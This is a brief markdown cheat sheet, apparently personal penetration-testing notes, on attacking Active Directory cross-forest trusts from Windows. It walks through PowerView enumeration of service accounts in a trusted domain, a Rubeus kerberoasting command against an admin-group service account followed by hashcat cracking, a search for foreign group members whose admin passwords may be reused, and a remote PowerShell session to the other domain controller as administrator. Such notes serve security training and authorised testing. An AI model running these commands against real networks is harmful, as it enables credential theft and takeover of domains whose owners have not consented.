# Cross-Forest Trust Abuse - from Windows

## Cross-Forest Kerberoasting
```
Kerberos attacks like Kerberoasting and ASREPRoasting can leverage trust relationships for execution. 
In domains with inbound/bidirectional domain/forest trust, you can launch various attacks for access. 
If unable to escalate within your domain, obtaining a Kerberos ticket and cracking a hash of an admin 
user in another domain with dual admin privileges could be an option.
```

## enumerate accounts in a target domain that have SPNs associated with them
```bash
Get-DomainUser -SPN -Domain MYDOMAIN.LOCAL | select SamAccountName
samaccountname
--------------
mssqlsvc
```

## Enumerating the mssqlsvc Account
check witch group 
```bash
Get-DomainUser -Domain MYDOMAIN.LOCAL -Identity mssqlsvc |select samaccountname,memberof
```
## Performing a Kerberoasting Attacking with Rubeus Using /domain Flag
we saw that mssqlsvc is on the admin group
```bash
.\Rubeus.exe kerberoast /domain:MYDOMAIN.LOCAL /user:mssqlsvc /nowrap
then crack the hash with hashcat
```
## Admin Password Re-Use & Group Membership
Sometimes, the user would be using the same password in the two domains, and owning Domain A instantly gave me full admin rights to Domain B.
But the username could not be the same (ex: John.doe // d.john_admin)
```bash
Get-DomainForeignGroupMember -Domain MYDOMAIN.LOCAL
# Convert-SidToName
Convert-SidToName S-1-5-21-384293......
```
## Accessing the other DC (DC3) Using Enter-PSSession
```bash
Enter-PSSession -ComputerName Computername-DC3.MYDOMAIN.LOCAL -Credential MYDOMAIN\administrator
```










